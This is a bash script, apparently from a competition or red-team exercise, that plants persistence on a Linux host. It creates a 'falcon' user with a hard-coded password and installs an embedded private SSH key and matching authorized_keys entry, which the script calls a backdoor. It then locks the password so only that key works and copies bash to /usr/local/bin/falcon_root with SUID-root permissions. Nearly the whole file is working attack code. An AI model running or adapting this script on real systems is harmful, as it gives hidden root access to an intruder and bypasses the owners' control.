#!/bin/bash
# Squad: falcon
# Purpose: Create squad user 'falcon', install SSH key backdoor (APT persistence),
# lock the known password, and add a single escalation method.

# Create the falcon user if it does not already exist
if ! id falcon >/dev/null 2>&1; then
  # Use same password style as template/users: passwordsAREwrong
  useradd --password "$(openssl passwd passwordsAREwrong)" falcon
fi

# Determine falcon's home directory
FHOME="$(getent passwd falcon | cut -d: -f6)"

# Ensure home directory exists
if [ ! -d "$FHOME" ]; then
  mkdir -p "$FHOME"
  chown falcon:falcon "$FHOME"
fi

# Set up .ssh directory
mkdir -p "$FHOME/.ssh"
chmod 700 "$FHOME/.ssh"

# Install private key used for scoring / backdoor access
cat <<'EOF' > "$FHOME/.ssh/scoring_key"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEAn7cz0PPX1wB3XSO6zZcEPxvpMxNj3Ye3Dmor68d+uc2Rya8FfSOE
fyBiAPef3A2B4XxK2wyg2yJ8yOUUHPnqSO7EfhzMnUxwfcqwMm+pkUmnCor8LfVzZjGKOk
jd1ETHg/oFIMBN3qdf3FJ4Q7ArM26U4lNTdV/c93KNlKYF0CcAAAIo7Ggv7OxoL+wAAAAH
c3NoLXJzYQAAAIEAn7cz0PPX1wB3XSO6zZcEPxvpMxNj3Ye3Dmor68d+uc2Rya8FfSOEfy
BiAPef3A2B4XxK2wyg2yJ8yOUUHPnqSO7EfhzMnUxwfcqwMm+pkUmnCor8LfVzZjGKOkjd
1ETHg/oFIMBN3qdf3FJ4Q7ArM26U4lNTdV/c93KNlKYF0CcAAAADAQABAAAAgQCMk+ATxs
zv/QUTAePmGUovkg2MW0DHODEzitfly84LFJmBf3/BSYXRr1sTpuEZ+vma0p/AdjkPKCfV
W2x8pKxE6SMGYRz91g7vfdSXK6Y5VcllJMfqAtCfcO3Ceq+zTg841PL8dQIDlTb4U/ZcgZ
TnXxy6sDRQk7kt2h0/ZDxN4QAAAEEAzL2hEpsFavZrU9x3LeYtrrmzfjQAsA3dRseYFN4G
2iVKmjJc6E8eFxGYrF09uazlAJ9+/mpvXY5p0M5QNukU7AAAAEEA1EhcB9f4h/xrfLcUAP
A2tYSysIy//EEIXZwNbzrH8j0yNPGF8e4t7Alk6mcNp2Oc8D6mnaNAossvW4aHT3oXQwAA
AEEAwJt8MJkemlMihsLUQ5k38dWSLSL6QSa2FVc7xwp/T7TgKC+qCYwxFNTaYMbq1mlJHO
n98l5iU0KpzvDtM1hbTQAAADByb290QGlwLTE3Mi0zMS00Ny0xMjUudXMtZWFzdC0yLmNv
bXB1dGUuaW50ZXJuYWwB
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 500 "$FHOME/.ssh/scoring_key"

# Install matching public key into authorized_keys
cat <<'EOF' > "$FHOME/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCftzPQ89fXAHddI7rNlwQ/G+kzE2Pdh7cOaivrx365zZHJrwV9I4R/IGIA95/cDYHhfErbDKDbInzI5RQc+epI7sR+HMydTHB9yrAyb6mRSacKivwt9XNmMYo6SN3URMeD+gUgwE3ep1/cUnhDsCszbpTiU1N1X9z3co2UpgXQJw== root@ip-172-31-47-125.us-east-2.compute.internal
EOF
chmod 544 "$FHOME/.ssh/authorized_keys"

# Ensure ownership is correct
chown -R falcon:falcon "$FHOME/.ssh"

# Persistence hardening: drop the known password "passwordsAREwrong"
# Lock the falcon account's password so only our SSH key works.
passwd -l falcon >/dev/null 2>&1

# Escalation method: SUID-root shell for falcon
# Single escalation path, fully removed by remove_falcon.sh
if [ -x /bin/bash ]; then
  cp /bin/bash /usr/local/bin/falcon_root
  chown root:root /usr/local/bin/falcon_root
  chmod 4755 /usr/local/bin/falcon_root
fi
